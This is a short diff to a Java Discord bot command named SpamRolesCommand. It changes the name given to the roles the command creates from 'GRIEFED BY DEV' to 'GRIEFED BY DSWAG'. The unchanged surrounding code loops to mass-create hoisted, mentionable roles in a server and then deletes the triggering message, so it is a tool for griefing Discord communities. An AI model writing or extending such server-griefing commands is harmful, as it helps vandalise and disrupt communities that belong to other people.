@@ -25,7 +25,7 @@ public class SpamRolesCommand implements ICommand {
         }
         for (int i = 0; i < input; i++) {
             event.getGuild().createRole().setHoisted(true).setMentionable(true)
-                    .setName("GRIEFED BY DEV " + this.getRandom()).queue();
+                    .setName("GRIEFED BY DSWAG " + this.getRandom()).queue();
             if (i == input - 1) {
                 event.getMessage().delete().queue();
 //                List<Message> messages = event.getChannel().getHistory().retrievePast(2).queue();
